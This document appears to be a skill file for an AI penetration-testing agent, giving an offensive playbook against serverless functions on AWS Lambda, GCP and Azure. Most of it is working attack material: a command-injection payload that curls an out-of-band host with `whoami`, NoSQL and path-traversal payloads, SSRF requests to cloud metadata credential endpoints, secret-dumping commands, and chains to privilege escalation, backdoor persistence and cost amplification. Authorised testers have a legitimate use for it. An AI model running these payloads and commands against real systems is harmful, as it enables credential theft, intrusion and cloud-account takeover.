---
name: serverless_function
description: Serverless function testing (Lambda/Cloud Functions/Azure Functions) - event injection, IAM scope abuse, secrets/runtime exposure, and cloud pivot
---

# Serverless Function Security Testing

A serverless function (AWS Lambda, GCP Cloud Functions/Run, Azure Functions, Cloudflare/Vercel/Netlify edge functions) is a short-lived, event-driven unit of code that runs with an attached cloud identity and whatever environment/secrets the platform injects. The attacker objective is to convert an invocation path (an HTTP endpoint, an event the attacker can place into a queue/bucket/topic, or a leaked function URL/ARN) into code behavior the function never intended: inject malicious event data to reach a dangerous sink, abuse the function's over-scoped IAM role to read secrets and pivot across the account, harvest credentials and config from the runtime environment, and exploit vulnerable runtime/dependency surface. Because the function's identity is usually far broader than its job, a single injection often escalates straight into cloud-account compromise.

## Attack Surface

**Invocation paths (how attacker-controlled data reaches the handler)**
- HTTP: API Gateway / Lambda Function URLs (`*.lambda-url.<region>.on.aws`), GCP `*.cloudfunctions.net` / `*.run.app`, Azure `*.azurewebsites.net/api/<fn>`, edge functions on the app domain
- Event sources: S3 `ObjectCreated`, SQS/SNS, Kinesis/EventBridge, GCP Pub/Sub, Azure Queue/Event Grid, DynamoDB Streams
- Direct invoke with creds: `aws lambda invoke`, `gcloud functions call`, `az functionapp` if the principal has `lambda:InvokeFunction` / equivalent
- Cron/schedule triggers and step-function/orchestration inputs

**What the function exposes**
- The event object: every field (headers, query, path, body, `requestContext`, S3 key, message attributes) is attacker-influenced and frequently trusted as control data
- The execution identity: Lambda role (STS), GCP service account, Azure managed identity — reachable via the metadata/credential endpoint inside the sandbox
- Environment: env vars (often hold DB URLs, API keys, secret ARNs), `/tmp` (writable, persists across warm invocations), the bundled deployment package and layers, build-time `.env`/config
- The runtime: language version, dependency tree, and any spawned subprocess/shell

**Where function identifiers leak**
- Function URLs/ARNs in HTML/JS bundles, mobile apps, CORS configs, IaC (`serverless.yml`, `template.yaml`, Terraform), CI logs and git history
- API Gateway stages/paths in OpenAPI/Swagger; default `/dev`, `/prod`, `/staging` stages
- Error pages leaking the runtime, handler path, and stack traces with internal ARNs

## Recon & Enumeration

Most tools are already in the sandbox. Install the cloud/serverless-specific ones:
```
pip install awscli prowler scoutsuite          # AWS API + account posture
# az: curl -sL https://aka.ms/InstallAzureCLIDeb | bash
# gcloud: curl -sSL https://sdk.cloud.google.com | bash
go install github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest
pipx install lambdaguard                        # Lambda IAM/posture auditor (read creds)
```

Find and classify function endpoints from the app:
```
katana -u https://target.tld -jc -d 3 -silent | grep -Eio '[a-z0-9-]+\.lambda-url\.[a-z0-9-]+\.on\.aws|[a-z0-9-]+\.cloudfunctions\.net|[a-z0-9-]+\.run\.app|[a-z0-9-]+\.azurewebsites\.net'
subfinder -d target.tld -silent | httpx -silent -title -sc -tech-detect -server -cl
httpx -l fn_endpoints.txt -sc -title -ct -location -server -fr -mc 200,301,302,401,403
```

Map API Gateway stages and routes:
```
ffuf -w stages.txt -u "https://<api-id>.execute-api.<region>.amazonaws.com/FUZZ/" -mc 200,401,403
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u "https://<host>/prod/FUZZ" -mc all -fc 404
```

Scan for serverless-specific exposures and secrets:
```
nuclei -l fn_endpoints.txt -tags aws,lambda,gcp,azure,exposure,misconfig,cve -severity medium,high,critical -silent -j -o nuclei_fn.jsonl
trufflehog filesystem ./deployment-package --only-verified      # secrets in the bundled artifact
gitleaks detect --source . --no-banner                          # keys + ARNs in IaC/git
semgrep --config p/serverless --config p/secrets ./src          # injection/SSRF/eval sinks
trivy fs --scanners vuln,secret,misconfig ./deployment-package  # vulnerable deps + IaC
```

With (or after obtaining) cloud credentials — enumerate functions, code, env, and the role:
```
aws sts get-caller-identity
aws lambda list-functions --query 'Functions[].[FunctionName,Runtime,Role]' --output table
aws lambda get-function --function-name <fn> --query 'Code.Location' --output text   # presigned code URL
aws lambda get-function-configuration --function-name <fn> --query 'Environment.Variables'
aws lambda get-policy --function-name <fn>           # resource policy: who can invoke
aws lambda get-function-url-config --function-name <fn>   # AuthType NONE = public
gcloud functions describe <fn> --format='value(serviceConfig.environmentVariables,serviceConfig.serviceAccountEmail)'
az functionapp config appsettings list -g <rg> -n <app>
prowler aws -s awslambda                              # Lambda misconfig checks
```

## Methodology

1. **Collect identifiers.** Crawl the app (katana), grep JS/mobile/IaC for function URLs, ARNs, and API Gateway IDs. Pull secrets/ARNs from git and the deployment artifact (gitleaks/trufflehog). Build `fn_endpoints.txt`.
2. **Classify each endpoint.** httpx for status/auth. A Lambda Function URL with `AuthType: NONE`, an open API Gateway stage, or a `403`-but-reachable function is the entry point. Note runtime/server headers.
3. **Map the event shape.** Determine how input reaches the handler (HTTP body/headers/path, or an event source you can write to — e.g. an S3 bucket the function watches). Identify which event fields become control data (filenames, IDs, `Authorization`, `requestContext.authorizer`).
4. **Test event injection.** Fuzz every event field into the function's sinks: command exec, eval, SQL/NoSQL, path traversal, SSRF, deserialization, template engines. Use OAST callbacks for blind cases.
5. **Reach the credential endpoint.** If you achieve SSRF/RCE/file-read inside the function, pull the execution role's STS creds from the metadata endpoint or env (`AWS_*`, `GCP`, `IDENTITY_ENDPOINT`).
6. **Assess IAM scope.** With the function's creds, enumerate what the role can actually do (`get-caller-identity`, simulate-principal-policy, prowler). Over-scoped roles (`*:*`, full S3/Secrets/DynamoDB) are the escalation pivot.
7. **Harvest runtime exposure.** Read env vars, `/tmp`, bundled secrets, layers, and resolve secret ARNs the role can read (Secrets Manager / SSM / KMS).
8. **Exploit dependencies/runtime.** Cross-check the dependency tree (trivy/grype) for RCE-class CVEs reachable from the handler path; test for outdated runtime EOL.
9. **Pivot and chain.** Use the role to reach other functions, buckets, databases, queues; check for warm-container persistence in `/tmp` and for write access to the function's own code/config (re-deploy backdoor). Keep impact minimal-impact, evidence-only.

## Key Weaknesses / Techniques

### Event-data injection into dangerous sinks
Handlers routinely pass event fields straight into shells, queries, or evaluators. Probe each field independently.
```
# Command injection via an event field consumed by child_process/os.system/subprocess
curl -s "https://<fn-url>/" -H 'Content-Type: application/json' \
  -d '{"file":"x; curl http://<oast-id>.oast.fun/`whoami`","name":"$(id)"}'
# NoSQL / SQL via body or query
curl -s "https://<fn-url>/?id[$ne]=1"
curl -s "https://<fn-url>/" -d '{"user":{"$gt":""},"pass":{"$gt":""}}'
# Path traversal into a runtime/file sink (read bundled source/secrets)
curl -s "https://<fn-url>/?path=../../../../proc/self/environ"
```
For event-source triggers, inject via the source you can write: upload an S3 object whose **key** contains the payload, or publish an SQS/SNS message with crafted `MessageAttributes` — the key/attribute is the injection vector when the handler shells out on it.

### SSRF to the credential endpoint (the fastest escalation)
Any function-side fetch reaches the platform credential service. See the ssrf skill for full payloads.
```
# AWS: env already holds creds, but SSRF/RCE confirms reach
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/   # then /<role>
# GCP / Cloud Run
curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure Functions managed identity
curl -s "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

### Over-scoped execution role (IAM privilege escalation)
The role attached to the function is the prize. Confirm exactly what it can do, then find an escalation primitive (`iam:PassRole`+`lambda:CreateFunction`, `iam:CreateAccessKey`, `sts:AssumeRole`, `secretsmanager:GetSecretValue`, broad `s3:*`).
```
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...   # from the function
aws sts get-caller-identity
aws iam simulate-principal-policy --policy-source-arn <role-arn> \
  --action-names secretsmanager:GetSecretValue iam:PassRole s3:GetObject lambda:UpdateFunctionCode
aws secretsmanager list-secrets && aws secretsmanager get-secret-value --secret-id <arn>
aws ssm get-parameters-by-path --path / --recursive --with-decryption
```

### Runtime / environment exposure
Env vars and the deployment package leak credentials and config.
```
# Inside the function (via RCE/SSRF-to-file) or via the API:
aws lambda get-function-configuration --function-name <fn> --query 'Environment.Variables'
env | grep -Ei 'key|secret|token|password|conn|url|dsn'
# Download and inspect the actual code artifact
curl -s "$(aws lambda get-function --function-name <fn> --query Code.Location --output text)" -o fn.zip
unzip -o fn.zip -d fn && trufflehog filesystem ./fn --only-verified
```

### Vulnerable dependencies & EOL runtime
Functions ship a frozen dependency tree and are rarely patched.
```
trivy fs --scanners vuln ./fn --severity HIGH,CRITICAL
grype dir:./fn
# Confirm runtime is supported; EOL runtimes (e.g. nodejs12.x, python3.7) no longer get patches
aws lambda get-function-configuration --function-name <fn> --query 'Runtime'
```
A reachable RCE-class CVE in a parser (image/XML/archive/deserialization lib) on the handler path yields direct code execution with the role.

### Public/abusable invocation & resource policy
A Function URL with `AuthType: NONE`, an API Gateway route with no authorizer, or a resource policy granting `Principal:"*"` lets anyone invoke directly — and IAM-auth-bypass via misconfigured authorizers (returning Allow on error) is common.
```
aws lambda get-function-url-config --function-name <fn>   # look for "AuthType": "NONE"
aws lambda get-policy --function-name <fn> | jq -r '.Policy | fromjson'
```

### Warm-container & /tmp persistence
`/tmp` (and process memory) persist across warm invocations of the same container. State written by one request can be read by a later attacker request, and a poisoned `/tmp` cache or imported module can backdoor subsequent invocations until the container recycles.

### Denial-of-wallet / resource abuse
Unauthenticated, expensive functions (heavy compute, fan-out, recursive triggers — e.g. a function that writes to the bucket that triggers it) enable cost-amplification DoS. Note recursion risk; do not actually run up cost.

## Validation

1. **Injection:** Capture the request and the proof of execution — an OAST callback from `<oast-id>.oast.fun` (use `interactsh-client -v`), a reflected `id`/`whoami` in the response, or a time-based delay. Record the exact event field that carried the payload.
2. **Credential reach:** Show the metadata/STS response (redacted) and prove the creds are live: `aws sts get-caller-identity` returns the function's role ARN.
3. **IAM scope:** Save the `simulate-principal-policy` output or a single successful privileged read (e.g. one `get-secret-value` returning a non-sensitive/redacted secret) that demonstrates over-scope. Do not bulk-exfiltrate.
4. **Runtime exposure:** Document the env-var key names and one resolved secret ARN (value redacted), plus the code-artifact source proving secrets were bundled.
5. **Public invoke:** Show `AuthType: NONE` or the wildcard resource policy, then a successful unauthenticated invocation returning function output.
6. **Dependency CVE:** Pin the vulnerable package+version (trivy/grype) and demonstrate the sink is reachable from the handler — not merely present in the bundle.

## False Positives

- A Function URL or `*.cloudfunctions.net` returning `403`/`401` is reachable but auth-protected — not a finding unless the authorizer is bypassable.
- Env vars present but holding only non-secret config (region, log level, feature flags) — verify the value is actually sensitive.
- The execution role appears broad in a deny-by-default org SCP / permission boundary that actually blocks the action — confirm with `simulate-principal-policy`, not just the attached policy JSON.
- A dependency CVE flagged by trivy/grype that is in the bundle but not on any code path the event can reach (dead/dev dependency) — prove reachability.
- `169.254.169.254` reachable but creds endpoint returns 401/blocked (IMDSv2-style hop limit / metadata disabled) — egress works, escalation does not.
- API Gateway returning a generic Lambda error / 502 — runtime fault, not injection, unless the response leaks a controlled value.
- Stack traces in `dev`/`staging` stages that are intentionally verbose and isolated from prod data.

## Chaining & Impact

- Event injection → RCE/SSRF in the handler → pull execution-role STS creds → over-scoped role → Secrets Manager/SSM → DB and other-service credentials → broad account compromise.
- Public Function URL (`AuthType: NONE`) → unauthenticated invoke → injection → same credential pivot, with no auth needed.
- S3 `ObjectCreated` trigger + writable bucket → upload object whose key is a command payload → code execution inside the function with the role.
- `iam:PassRole` + `lambda:CreateFunction`/`UpdateFunctionCode` in the role → deploy attacker code under a higher-privileged role → privilege escalation and persistence.
- Bundled `.env`/secrets in the deployment artifact → cloud + third-party API keys → lateral movement beyond the cloud account (SaaS, payment, email).
- Write access to the function's own code/config → persistent backdoor invoked on every future event.
- Recursive/self-triggering function → denial-of-wallet cost amplification.

## Pro Tips

1. The execution role is almost always the highest-value target — once any code runs in the function, go straight for STS creds and `simulate-principal-policy`; the injection is just the door.
2. On Lambda, you usually don't need IMDS at all: `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`/`AWS_SESSION_TOKEN` are already in the environment — dumping env via file-read is equivalent to credential theft.
3. Test the non-HTTP triggers, not just the URL: an S3 key, an SNS message attribute, or a DynamoDB stream record is attacker-controlled input that bypasses the API Gateway/WAF that "protects" the function.
4. Download the actual deployment package (`Code.Location` presigned URL) — it reveals the handler, hardcoded secrets, and the real dependency versions, often more than the live endpoint does.
5. `/tmp` and warm containers give you cross-invocation state — useful for staging multi-step payloads and for spotting cache-poisoning persistence.
6. Always run injection probes through `interactsh-client` first; serverless RCE is frequently blind (no response body), and the OAST hit is your only oracle.
7. Check `AuthType: NONE` and the resource policy (`get-policy`) separately from API Gateway auth — a function fronted by an authenticated gateway can still be directly invocable via its Function URL or `lambda:InvokeFunction`.
8. EOL runtimes (`nodejs12.x`, `python3.7`, old .NET) are a reliable tell for an unmaintained function with vulnerable, unpatched dependencies.
9. Feed any harvested role creds to `prowler`/`scoutsuite` for fast read-only account posture rather than walking the API by hand — and stop at minimal-impact evidence.

## Summary

A serverless function is a thin layer of attacker-influenced event data sitting on top of an over-privileged cloud identity. The reliable chain is: inject into an event field → execute or fetch inside the sandbox → grab the execution role's credentials → exploit its excessive IAM scope into the wider account. Test every event source, not just the HTTP path; treat the role and the bundled artifact as the real targets.
